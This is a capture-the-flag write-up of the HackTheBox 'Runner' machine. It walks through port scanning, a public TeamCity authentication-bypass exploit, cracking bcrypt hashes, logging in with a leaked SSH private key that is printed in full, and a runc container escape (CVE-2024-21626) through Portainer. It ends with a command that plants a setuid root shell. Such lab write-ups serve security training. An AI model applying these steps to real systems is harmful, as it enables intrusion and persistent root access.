---
title: HackTheBox - Runner
date: Fri Aug 16 01:17:26 AM EDT 2024
categories: [PentestNotes]
tags: [linux,portainer,teamcity,subdomains,dns,htb,htb_season_5]
---

## Recon

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
Note: nscan was too fast and didn't pick up all the ports.

┌──(woyag㉿kraken)-[~/Desktop/Rooms/Runner]
└─$ rustscan -a 10.10.11.13 --ulimit 5000 -b 100
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.13:22
Open 10.10.11.13:80
Open 10.10.11.13:8000
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-14 16:02 UTC
Initiating Ping Scan at 16:02
Scanning 10.10.11.13 [2 ports]
Completed Ping Scan at 16:02, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.11.13 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.19 seconds

┌──(woyag㉿kraken)-[~/Desktop/Rooms/Runner]
└─$ nmap -p22,80,8000 -sV -sC -Pn runner.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 12:08 EDT
Nmap scan report for runner.htb (10.10.11.13)
Host is up (0.10s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Runner - CI/CD Specialists
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

{::options parse_block_html="false" /}

## HTTP (80)

Port 80 seems to be server hosting services:

![Pasted image 20240527180642.png](/assets/images/Season 5/Runner/Pasted image 20240527180642.png)

Directory/subdomain enumeration came empty handed. The common CI/CD pipeline software we have seen if `TeamCity` which isn't included in wordlists so I tried it manually:
```bash
┌──(woyag㉿kraken)-[~/Desktop/Rooms/Runner]
└─$ curl runner.htb -H 'Host: teamcity.runner.htb' -i
HTTP/1.1 401
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 27 May 2024 14:09:42 GMT
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store

Authentication required
To login manually go to "/login.html" page
```

## TeamCity

![Pasted image 20240527181655.png](/assets/images/Season 5/Runner/Pasted image 20240527181655.png)
We need credentials for login...

Under login we see version number and quick google leads us to CVE: https://github.com/Zyad-Elsayed/CVE-2023-42793

```bash
┌──(woyag㉿kraken)-[~/Desktop/Rooms/Runner]
└─$ py CVE-2023-42793/CVE-2023-42793.py -u http://teamcity.runner.htb
[+] http://teamcity.runner.htb/login.html [H454NSec1037:@H454NSec]
```

![Pasted image 20240527182126.png](/assets/images/Season 5/Runner/Pasted image 20240527182126.png)
There are no `Agents` that can do pipelines for us so there's no point in creating project and trying to setup pipeline for RCE.

Let's get backup for config files or interesting files:
![Pasted image 20240527182642.png](/assets/images/Season 5/Runner/Pasted image 20240527182642.png)

Hashes found?
![Pasted image 20240527183339.png](/assets/images/Season 5/Runner/Pasted image 20240527183339.png)
![Pasted image 20240527183725.png](/assets/images/Season 5/Runner/Pasted image 20240527183725.png)

```powershell
➜ cat .\hashes
$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye
$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em

➜ .\hashcat.exe --show .\hashes
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

➜ .\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=rockyou.txt --format=bcrypt .\hashes
...
$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
```

Looks like we also have `id_rsa` key:
![Pasted image 20240527184407.png](/assets/images/Season 5/Runner/Pasted image 20240527184407.png)

## SSH (22)

```perl
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

Verify owner:
```bash
┌──(woyag㉿kraken)-[~/Desktop/Rooms/Runner]
└─$ ssh-keygen -l -f id_rsa
3072 SHA256:YBrlVeYeOPwQhNizkxaVtrtBTlLZ2/T5XBekbmDbEL4 john@runner (RSA)

┌──(woyag㉿kraken)-[~/Desktop/Rooms/Runner]
└─$ ssh john@runner.htb -i id_rsa
```

No password.. hmm... It's still a good idea to know it.

## User.txt

```bash
john@runner:~$ cat user.txt
06994b1d5849190310fc4e41f9b6a034
```

## Privilege Escalation

We only managed to get `mattew`'s password, but where can we use it? `su` doesn't work.

```bash
john@runner:~$ ss -tlpn4
State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process
LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*
LISTEN      0           4096                 127.0.0.1:8111                0.0.0.0:*
LISTEN      0           4096                 127.0.0.1:9443                0.0.0.0:*
LISTEN      0           4096                 127.0.0.1:5005                0.0.0.0:*
LISTEN      0           4096                 127.0.0.1:9000                0.0.0.0:*
LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*
LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*
```

We have few applications running, we know 8111 is TeamCity, but what are others?

`Portainer` is running on `9000` and `9433` is probably HTTPs version of it. 5005 seems unresponsive to http and netcat shows nothing.
![Pasted image 20240527185534.png](/assets/images/Season 5/Runner/Pasted image 20240527185534.png)

```bash
john@runner:/data$ find / -name '*portainer*' -ls 2>/dev/null
     1042      0 lrwxrwxrwx   1 root     root           32 May 27 13:50 /run/systemd/units/invocation:portainer.service -> e4d709e3c81d4bd489261b0b325c9f25
    61374      0 lrwxrwxrwx   1 root     root           37 Feb 28 07:57 /etc/systemd/system/multi-user.target.wants/portainer.service -> /etc/systemd/system/portainer.service
    61382      4 -rw-r--r--   1 root     root          276 Feb 28 20:25 /etc/systemd/system/portainer.service
    61576      0 lrwxrwxrwx   1 root     root           36 Feb 28 20:31 /etc/nginx/sites-enabled/portainer -> /etc/nginx/sites-available/portainer
    62184      4 -rw-r--r--   1 root     root          352 Feb 28 22:24 /etc/nginx/sites-available/portainer
   393229     88 -rw-------   1 root     root       131072 May 27 14:55 /data/portainer.db
   393232      4 -rw-------   1 root     root          227 Feb 28 07:51 /data/portainer.key
   393233      4 -rw-------   1 root     root          190 Feb 28 07:51 /data/portainer.pub
     1039      4 drwxr-xr-x   4 root     docker       4096 Apr  4 10:24 /opt/portainer
     1579  49924 -rwxr-xr-x   1 root     docker   51122176 Dec  7 08:15 /opt/portainer/portainer
     3094      0 drwxr-xr-x   2 root     root            0 May 27 13:50 /sys/fs/cgroup/system.slice/portainer.service
john@runner:/data$ cd /opt/portainer/
john@runner:/opt/portainer$ ls -l
total 252236
-rwxr-xr-x 1 root docker 48047088 Dec  7 08:15 docker
-rwxr-xr-x 1 root docker 60470973 Dec  7 08:15 docker-compose
-rwxr-xr-x 1 root docker 50597888 Dec  7 08:15 helm
-rwxr-xr-x 1 root docker 48037888 Dec  7 08:15 kubectl
drwxr-xr-x 2 root docker     4096 Apr  4 10:24 mustache-templates
-rwxr-xr-x 1 root docker 51122176 Dec  7 08:15 portainer
drwxr-xr-x 3 root docker     4096 Apr  4 10:24 public
john@runner:/opt/portainer$ ls public/
060b2710bdbbe3dfe48b.svg  51906a7e4bd0e1d9e771.png  9d07a3ace464cfd6e27c.png  main.712d6f30396f42406a3d.js              runtime.942fa683274b3d3c26cf.js      vendor.c6c227160a59d929ec43.js
112a479c093f4729251d.png  63a301f0574f1a696ce6.png  c2c179f41199d25e0055.png  main.712d6f30396f42406a3d.js.LICENSE.txt  runtime.942fa683274b3d3c26cf.js.map  vendor.c6c227160a59d929ec43.js.LICENSE.txt
19c2b168a8d85994e14e.png  63c1259abd88a9d2cebc.svg  d3a18c5002453f58c8b9.png  main.712d6f30396f42406a3d.js.map          timeout.html                         vendor.c6c227160a59d929ec43.js.map
2b3c7053dcd54989a6f5.png  6d50eaeb9f128c130ed9.xml  index.html                main.7d6053e1c574421c1788.css             vendor.b4533442c1cbb18b98a1.css
2dcfc527d067d4ae3424.png  7e697c5bab4f819328df.svg  locales                   main.7d6053e1c574421c1788.css.map         vendor.b4533442c1cbb18b98a1.css.map
```

It seems we have a build version and probably only way to interact with it is to port forward it.

```bash
└─$ ssh john@runner.htb -i id_rsa -L 9000:127.0.0.1:9000
```

![Pasted image 20240527190118.png](/assets/images/Season 5/Runner/Pasted image 20240527190118.png)

Using credentials `matthew:piper123` we are able to login.

-> Googling `docker escape cve`
-> https://medium.com/@sk3pper/play-with-cve-2024-21626-2b4377e9577f
-> https://github.com/NitroCao/CVE-2024-21626

![Pasted image 20240527190607.png](/assets/images/Season 5/Runner/Pasted image 20240527190607.png)

primary page:

![Pasted image 20240527190648.png](/assets/images/Season 5/Runner/Pasted image 20240527190648.png)

Available images:

![Pasted image 20240527190840.png](/assets/images/Season 5/Runner/Pasted image 20240527190840.png)

Create new container:
![Pasted image 20240527191043.png](/assets/images/Season 5/Runner/Pasted image 20240527191043.png)

![Pasted image 20240527191119.png](/assets/images/Season 5/Runner/Pasted image 20240527191119.png)

![Pasted image 20240527191219.png](/assets/images/Season 5/Runner/Pasted image 20240527191219.png)

It kept complaining about `/proc/self/fd/8` for about 300 millisecond and shut down right away.

It worked with `/proc/self/fd/7`, but after some time `8` also worked? I guess build step failed or something on previous:

![Pasted image 20240527193513.png](/assets/images/Season 5/Runner/Pasted image 20240527193513.png)

```bash
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@67ab15dc91e3:.# ls /root
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@67ab15dc91e3:.# ls ../../../../../../../../../root
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
docker_clean.sh  initial_state.txt  monitor.sh  root.txt
root@67ab15dc91e3:.# cd ../../../../../../../../../root
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@67ab15dc91e3:../../../../../../../../../root# ls
docker_clean.sh  initial_state.txt  monitor.sh  root.txt
root@67ab15dc91e3:../../../../../../../../../root# cat root.txt
3d236479467eb9441598807fe1965163
root@67ab15dc91e3:../../../../../../../../../root# cp /bin/sh ../tmp/rootsh && chmod 4777 ../tmp/rootsh 
```

---

Writeup referenced:
[https://blog.taipanbyte.ru/hackthebox/Runner-HTB-Writeup](https://blog.taipanbyte.ru/hackthebox/Runner-HTB-Writeup)

